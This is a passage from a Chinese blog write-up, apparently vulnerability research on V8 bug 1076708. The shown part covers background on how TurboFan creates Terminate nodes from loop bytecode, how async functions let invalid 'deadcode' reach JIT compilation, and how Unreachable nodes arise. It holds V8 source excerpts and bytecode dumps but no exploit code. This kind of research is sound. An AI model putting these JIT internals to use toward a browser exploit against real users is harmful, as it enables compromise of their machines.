<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
  </script>

  <meta name="description" content="0x01 前置知识 Terminate节点的生成 DeadCode Unreachable节点的生成   0x02 漏洞分析 patch分析 修复后的情况 POC分析 其他问题 漏洞利用   0x04 补充 0x05 小结 0x06 感想 0x07 参考  0x01 前置知识Terminate节点的生成">
<meta property="og:type" content="article">
<meta property="og:title" content="Issues-1076708 漏洞分析">
<meta property="og:url" content="https://github.com/2021/08/05/issues-1076708/index.html">
<meta property="og:site_name" content="ha1vk&#39;s blog">
<meta property="og:description" content="0x01 前置知识 Terminate节点的生成 DeadCode Unreachable节点的生成   0x02 漏洞分析 patch分析 修复后的情况 POC分析 其他问题 漏洞利用   0x04 补充 0x05 小结 0x06 感想 0x07 参考  0x01 前置知识Terminate节点的生成">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.loli.net/2021/07/12/6gckm5epAYM43OT.png">
<meta property="og:image" content="https://i.loli.net/2021/07/12/j4TqruzcYyA9aUB.png">
<meta property="og:image" content="https://i.loli.net/2021/07/12/VuHyBFT39kKtbl2.png">
<meta property="og:image" content="https://i.loli.net/2021/07/12/oEUqHpbvzODg4NI.png">
<meta property="og:image" content="https://i.loli.net/2021/07/12/y9gprt1F2oakACU.png">
<meta property="og:image" content="https://i.loli.net/2021/07/12/T7k3FvoeSynEMWa.png">
<meta property="og:image" content="https://i.loli.net/2021/07/12/khH1BDfJTtErlUS.png">
<meta property="og:image" content="https://i.loli.net/2021/07/12/R8g1JiCGu3KAehU.png">
<meta property="og:image" content="https://i.loli.net/2021/07/13/rSHIk2519iayvcK.png">
<meta property="og:image" content="https://i.loli.net/2021/07/13/m5a1wVt3Sf9UKCz.png">
<meta property="og:image" content="https://i.loli.net/2021/07/13/eY9y1OVCXZlBvF3.png">
<meta property="og:image" content="https://i.loli.net/2021/07/13/A78s2wZmWX5UqKa.png">
<meta property="og:image" content="https://i.loli.net/2021/07/13/CfOIdXViWx15yjG.png">
<meta property="og:image" content="https://i.loli.net/2021/07/13/qS3mMHeLhpN9TY5.png">
<meta property="og:image" content="https://i.loli.net/2021/07/13/dRjEat5AueK6Jvh.png">
<meta property="og:image" content="https://i.loli.net/2021/07/13/P63WDtLU1Fs9VmA.png">
<meta property="og:image" content="https://i.loli.net/2021/07/13/aRf7Sl8ucZQO2HK.png">
<meta property="og:image" content="https://i.loli.net/2021/08/02/XjfbxS1KoQEvq2D.png">
<meta property="og:image" content="https://i.loli.net/2021/08/02/5rq3OgK98SvNYUG.png">
<meta property="og:image" content="https://i.loli.net/2021/08/02/cCNisw6poam84Y3.png">
<meta property="og:image" content="https://i.loli.net/2021/08/02/Y3DLMO1p2IjRUum.png">
<meta property="og:image" content="https://i.loli.net/2021/07/13/izfgV5F1UMGaxwI.png">
<meta property="og:image" content="https://i.loli.net/2021/07/13/podKcvOBQjkxhTL.png">
<meta property="og:image" content="https://i.loli.net/2021/07/13/jD3p2kwTAbxECzO.png">
<meta property="og:image" content="https://i.loli.net/2021/07/13/28mTMuzfSCboZl6.png">
<meta property="og:image" content="https://i.loli.net/2021/07/13/4mLkYG8XyQ7bRlE.png">
<meta property="og:image" content="https://i.loli.net/2021/07/13/YEDdLaHfncZiUCl.png">
<meta property="og:image" content="https://i.loli.net/2021/07/14/WEdFD4Z5jT7QpGN.png">
<meta property="og:image" content="https://i.loli.net/2021/07/14/hDg9lbBKrmnLMzk.png">
<meta property="og:image" content="https://i.loli.net/2021/07/14/GWyOYoEmqT1PKMN.png">
<meta property="og:image" content="https://i.loli.net/2021/07/14/rs4xkDUfXpJE7RC.png">
<meta property="og:image" content="https://i.loli.net/2021/07/14/QNU2ywqYldnRJcz.png">
<meta property="og:image" content="https://i.loli.net/2021/07/14/yY6Wr2sVh49mLn1.png">
<meta property="og:image" content="https://i.loli.net/2021/08/05/C8tWucegvLwzZTH.png">
<meta property="og:image" content="https://i.loli.net/2021/08/05/1q58ARklfBZnHzV.png">
<meta property="og:image" content="https://i.loli.net/2021/08/05/OmBjcozHAC1LXKl.png">
<meta property="og:image" content="https://i.loli.net/2021/08/05/wRX4uJnqiC6gaML.png">
<meta property="og:image" content="https://i.loli.net/2021/08/05/j9qn7A652sEmWZf.png">
<meta property="article:published_time" content="2021-08-05T08:29:07.000Z">
<meta property="article:modified_time" content="2025-06-26T10:27:25.802Z">
<meta property="article:author" content="ha1vk">
<meta property="article:tag" content="JS引擎漏洞">
<meta property="article:tag" content="类型混淆">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2021/07/12/6gckm5epAYM43OT.png">

<link rel="canonical" href="https://github.com/2021/08/05/issues-1076708/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>Issues-1076708 漏洞分析 | ha1vk's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">ha1vk's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/2021/08/05/issues-1076708/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ha1vk">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ha1vk's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          Issues-1076708 漏洞分析
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-08-05 16:29:07" itemprop="dateCreated datePublished" datetime="2021-08-05T16:29:07+08:00">2021-08-05</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">安全研究</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <ul>
<li><a href="#0x01-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86">0x01 前置知识</a><ul>
<li><a href="#terminate%E8%8A%82%E7%82%B9%E7%9A%84%E7%94%9F%E6%88%90">Terminate节点的生成</a></li>
<li><a href="#deadcode">DeadCode</a></li>
<li><a href="#unreachable%E8%8A%82%E7%82%B9%E7%9A%84%E7%94%9F%E6%88%90">Unreachable节点的生成</a></li>
</ul>
</li>
<li><a href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">0x02 漏洞分析</a><ul>
<li><a href="#patch%E5%88%86%E6%9E%90">patch分析</a></li>
<li><a href="#%E4%BF%AE%E5%A4%8D%E5%90%8E%E7%9A%84%E6%83%85%E5%86%B5">修复后的情况</a></li>
<li><a href="#poc%E5%88%86%E6%9E%90">POC分析</a></li>
<li><a href="#%E5%85%B6%E4%BB%96%E9%97%AE%E9%A2%98">其他问题</a></li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">漏洞利用</a></li>
</ul>
</li>
<li><a href="#0x04-%E8%A1%A5%E5%85%85">0x04 补充</a></li>
<li><a href="#0x05-%E5%B0%8F%E7%BB%93">0x05 小结</a></li>
<li><a href="#0x06-%E6%84%9F%E6%83%B3">0x06 感想</a></li>
<li><a href="#0x07-%E5%8F%82%E8%80%83">0x07 参考</a></li>
</ul>
<h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h2><h3 id="Terminate节点的生成"><a href="#Terminate节点的生成" class="headerlink" title="Terminate节点的生成"></a>Terminate节点的生成</h3><p>首先该漏洞与Terminate节点有关，那么我们先来研究一下Terminate节点是如何生成的。在代码目录中使用Visual Studio搜索<code>common()-&gt;Terminate()</code>，发现在<code>src\compiler\bytecode-graph-builder.cc</code>文件中有一处代码生成了Terminate节点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">void BytecodeGraphBuilder::Environment::PrepareForLoop(</span><br><span class="line">    const BytecodeLoopAssignments&amp; assignments,</span><br><span class="line">    const BytecodeLivenessState* liveness) &#123;</span><br><span class="line">  // Create a control node for the loop header.</span><br><span class="line">  Node* control = builder()-&gt;NewLoop();</span><br><span class="line"></span><br><span class="line">  …………………………………………………………</span><br><span class="line">  // Connect to the loop end.</span><br><span class="line">  Node* terminate = builder()-&gt;graph()-&gt;NewNode(</span><br><span class="line">      builder()-&gt;common()-&gt;Terminate(), effect, control);</span><br><span class="line">  builder()-&gt;exit_controls_.push_back(terminate);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续搜索该函数的调用<code>BuildGraphFromBytecode-&gt;CreateGraph-&gt;VisitBytecodes-&gt;VisitSingleBytecode-&gt;BuildLoopHeaderEnvironment-&gt;PrepareForLoop</code>，其中<code>BuildLoopHeaderEnvironment</code>中调用<code>PrepareForLoop</code>的条件如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">void BytecodeGraphBuilder::BuildLoopHeaderEnvironment(int current_offset) &#123;</span><br><span class="line">  if (bytecode_analysis().IsLoopHeader(current_offset)) &#123;</span><br><span class="line">  .........................................</span><br><span class="line">    // Add loop header.</span><br><span class="line">    environment()-&gt;PrepareForLoop(loop_info.assignments(), liveness);</span><br><span class="line">  .........................................</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>IsLoopHeader的代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bool BytecodeAnalysis::IsLoopHeader(int offset) const &#123;</span><br><span class="line">  return header_to_info_.find(offset) != header_to_info_.end();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>即在header_to_info_中如果存在这个offset的话就判断通过，搜索header_to_info_的引用，发现在<code>BytecodeAnalysis::PushLoop</code>中有对header_to_info_进行插入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">void BytecodeAnalysis::PushLoop(int loop_header, int loop_end) &#123;</span><br><span class="line">  DCHECK(loop_header &lt; loop_end);</span><br><span class="line">  DCHECK(loop_stack_.top().header_offset &lt; loop_header);</span><br><span class="line">  DCHECK(end_to_header_.find(loop_end) == end_to_header_.end());</span><br><span class="line">  DCHECK(header_to_info_.find(loop_header) == header_to_info_.end());</span><br><span class="line"></span><br><span class="line">  int parent_offset = loop_stack_.top().header_offset;</span><br><span class="line"></span><br><span class="line">  end_to_header_.insert(&#123;loop_end, loop_header&#125;);</span><br><span class="line">  auto it = header_to_info_.insert(</span><br><span class="line">      &#123;loop_header, LoopInfo(parent_offset, bytecode_array_-&gt;parameter_count(),</span><br><span class="line">                             bytecode_array_-&gt;register_count(), zone_)&#125;);</span><br><span class="line">  // Get the loop info pointer from the output of insert.</span><br><span class="line">  LoopInfo* loop_info = &amp;it.first-&gt;second;</span><br><span class="line"></span><br><span class="line">  loop_stack_.push(&#123;loop_header, loop_info&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续查找<code>BytecodeAnalysis::PushLoop</code>的调用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">void BytecodeAnalysis::Analyze() &#123;</span><br><span class="line">  ........................</span><br><span class="line">  for (iterator.GoToEnd(); iterator.IsValid(); --iterator) &#123;</span><br><span class="line">    Bytecode bytecode = iterator.current_bytecode();</span><br><span class="line">    int current_offset = iterator.current_offset();</span><br><span class="line"></span><br><span class="line">    ....................</span><br><span class="line">    </span><br><span class="line">    if (bytecode == Bytecode::kJumpLoop) &#123;</span><br><span class="line">      // Every byte up to and including the last byte within the backwards jump</span><br><span class="line">      // instruction is considered part of the loop, set loop end accordingly.</span><br><span class="line">      int loop_end = current_offset + iterator.current_bytecode_size();</span><br><span class="line">      int loop_header = iterator.GetJumpTargetOffset();</span><br><span class="line">      PushLoop(loop_header, loop_end);</span><br></pre></td></tr></table></figure>
<p>即在ByteCode中有<code>Bytecode::kJumpLoop</code>，就可以生成Terminate节点。根据名字，推测出<code>Bytecode::kJumpLoop</code>与循环有关，使用如下代码进行测试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">for (var i=0;i&lt;0x1;i++) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">./d8 t.js --print-bytecode</span><br><span class="line">[generated bytecode for function:  (0x2ee80824ff85 &lt;SharedFunctionInfo&gt;)]</span><br><span class="line">Parameter count 1</span><br><span class="line">Register count 3</span><br><span class="line">Frame size 24</span><br><span class="line">         .................................................</span><br><span class="line">         0x2ee80825001b @   41 : 8a 15 00          JumpLoop [21], [0] (0x2ee808250006 @ 20)</span><br><span class="line">         0x2ee80825001e @   44 : 25 fb             Ldar r0</span><br><span class="line">         0x2ee808250020 @   46 : ab                Return </span><br><span class="line">Constant pool (size = 2)</span><br><span class="line">0x2ee80824ffc1: [FixedArray] in OldSpace</span><br><span class="line"> - map: 0x2ee8080404b1 &lt;Map&gt;</span><br><span class="line"> - length: 2</span><br><span class="line">           0: 0x2ee80824ffad &lt;FixedArray[1]&gt;</span><br><span class="line">           1: 0x2ee80808ab69 &lt;String[#1]: i&gt;</span><br><span class="line">Handler Table (size = 0)</span><br><span class="line">Source Position Table (size = 0)</span><br></pre></td></tr></table></figure>
<p>然后使用如下代码进行测试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">var i = 1;</span><br><span class="line">while (i--) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">./d8 t.js --print-bytecode</span><br><span class="line">[generated bytecode for function:  (0x30f00824ff85 &lt;SharedFunctionInfo&gt;)]</span><br><span class="line">Parameter count 1</span><br><span class="line">Register count 3</span><br><span class="line">Frame size 24</span><br><span class="line">         ..............................................</span><br><span class="line">         0x30f008250018 @   38 : 8a 11 00          JumpLoop [17], [0] (0x30f008250007 @ 21)</span><br><span class="line">         0x30f00825001b @   41 : 25 fb             Ldar r0</span><br><span class="line">         0x30f00825001d @   43 : ab                Return </span><br><span class="line">Constant pool (size = 2)</span><br><span class="line">0x30f00824ffc1: [FixedArray] in OldSpace</span><br><span class="line"> - map: 0x30f0080404b1 &lt;Map&gt;</span><br><span class="line"> - length: 2</span><br><span class="line">           0: 0x30f00824ffad &lt;FixedArray[1]&gt;</span><br><span class="line">           1: 0x30f00808ab69 &lt;String[#1]: i&gt;</span><br><span class="line">Handler Table (size = 0)</span><br><span class="line">Source Position Table (size = 0)</span><br></pre></td></tr></table></figure>
<p>由此可以知道，只要是循环语句，就可以生成<code>JumpLoop</code>字节码，即使代码是无效的(deadcode)。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">while (deadcode) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">./d8 t.js --print-bytecode</span><br><span class="line">[generated bytecode for function:  (0x33390824ff99 &lt;SharedFunctionInfo&gt;)]</span><br><span class="line">Parameter count 1</span><br><span class="line">Register count 1</span><br><span class="line">Frame size 8</span><br><span class="line">         ...........................................</span><br><span class="line">         0x333908250000 @   10 : 8a 06 00          JumpLoop [6], [0] (0x33390824fffa @ 4)</span><br><span class="line">         0x333908250003 @   13 : 25 fb             Ldar r0</span><br><span class="line">   22 S&gt; 0x333908250005 @   15 : ab                Return </span><br><span class="line">Constant pool (size = 1)</span><br><span class="line">0x33390824ffc9: [FixedArray] in OldSpace</span><br><span class="line"> - map: 0x3339080404b1 &lt;Map&gt;</span><br><span class="line"> - length: 1</span><br><span class="line">           0: 0x33390824ff61 &lt;String[#8]: deadcode&gt;</span><br><span class="line">Handler Table (size = 0)</span><br><span class="line">Source Position Table (size = 8)</span><br><span class="line">0x333908250085 &lt;ByteArray[8]&gt;</span><br><span class="line">t.js:1: ReferenceError: deadcode is not defined</span><br><span class="line">while (deadcode) &#123;</span><br><span class="line">       ^</span><br><span class="line">ReferenceError: deadcode is not defined</span><br><span class="line">    at t.js:1:8</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>现在，我们加入JIT，并分析其生成的IR图</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var x = 0;</span><br><span class="line">for (var i=0;i&lt;0x20000;i++) &#123;</span><br><span class="line">   x += i;</span><br><span class="line">&#125;</span><br><span class="line">print(x);</span><br></pre></td></tr></table></figure>
<p>可以看到，确实生成了Terminate节点<br><img src="https://i.loli.net/2021/07/12/6gckm5epAYM43OT.png" alt="image.png"></p>
<h3 id="DeadCode"><a href="#DeadCode" class="headerlink" title="DeadCode"></a>DeadCode</h3><p>在JS中出现语义错误的代码（变量未定义、函数未定义等），也是可以被加入JIT中编译的，并且有可以使用一种方法让解释器不报错，如下代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function opt() &#123;</span><br><span class="line">   x += i;</span><br><span class="line">&#125;</span><br><span class="line">opt();</span><br></pre></td></tr></table></figure>
<p>显然，x和i在在当前上下文中都没有定义，执行这段代码解释器直接报错，opt里的代码就叫做<code>deadcode</code>，我们在函数前加上一个async，就不会报错了，因为这变成异步函数了，解释器还来不及检查</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">async function opt() &#123;</span><br><span class="line">   x += i;</span><br><span class="line">&#125;</span><br><span class="line">opt();</span><br></pre></td></tr></table></figure>
<p>现在，加入JIT编译</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">async function opt() &#123;</span><br><span class="line">   x += i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (var i=0;i&lt;0x10000;i++) &#123;</span><br><span class="line">   opt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现也可以成功编译，并且在EscapeAnalysis阶段被标记为了Dead，这是由于在函数中分析出所有的变量都没有逃逸，因此直接确定为Dead了。<br><img src="https://i.loli.net/2021/07/12/j4TqruzcYyA9aUB.png" alt="image.png"><br>现在将x外提，使得x发生逃逸</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var x = 0;</span><br><span class="line">async function opt() &#123;</span><br><span class="line">   x += i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (let i=0;i&lt;0x10000;i++) &#123;</span><br><span class="line">   opt();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这回没有发现Dead节点的生成。</p>
<h3 id="Unreachable节点的生成"><a href="#Unreachable节点的生成" class="headerlink" title="Unreachable节点的生成"></a>Unreachable节点的生成</h3><p> Unreachable是一种节点，在本漏洞中也有用到，我们来分析一下，其是在<code>DeadCodeElimination::ReduceEffectNode</code>中生成的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Reduction DeadCodeElimination::ReduceEffectNode(Node* node) &#123;</span><br><span class="line">  DCHECK_EQ(1, node-&gt;op()-&gt;EffectInputCount());</span><br><span class="line">  Node* effect = NodeProperties::GetEffectInput(node, 0);</span><br><span class="line">  if (effect-&gt;opcode() == IrOpcode::kDead) &#123;</span><br><span class="line">    return Replace(effect);</span><br><span class="line">  &#125;</span><br><span class="line">  if (Node* input = FindDeadInput(node)) &#123;</span><br><span class="line">    if (effect-&gt;opcode() == IrOpcode::kUnreachable) &#123;</span><br><span class="line">      RelaxEffectsAndControls(node);</span><br><span class="line">      return Replace(DeadValue(input));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Node* control = node-&gt;op()-&gt;ControlInputCount() == 1</span><br><span class="line">                        ? NodeProperties::GetControlInput(node, 0)</span><br><span class="line">                        : graph()-&gt;start();</span><br><span class="line">    Node* unreachable =</span><br><span class="line">        graph()-&gt;NewNode(common()-&gt;Unreachable(), effect, control);</span><br><span class="line">    NodeProperties::SetType(unreachable, Type::None());</span><br><span class="line">    ReplaceWithValue(node, DeadValue(input), node, control);</span><br><span class="line">    return Replace(unreachable);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return NoChange();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其调用链如下<code>DeadCodeElimination::Reduce-&gt;DeadCodeElimination::ReduceNode-&gt;DeadCodeElimination::ReduceEffectNode</code>,DeadCodeElimination在多个阶段被调用，其中在<code>TypedLoweringPhase</code>就有被调用。</p>
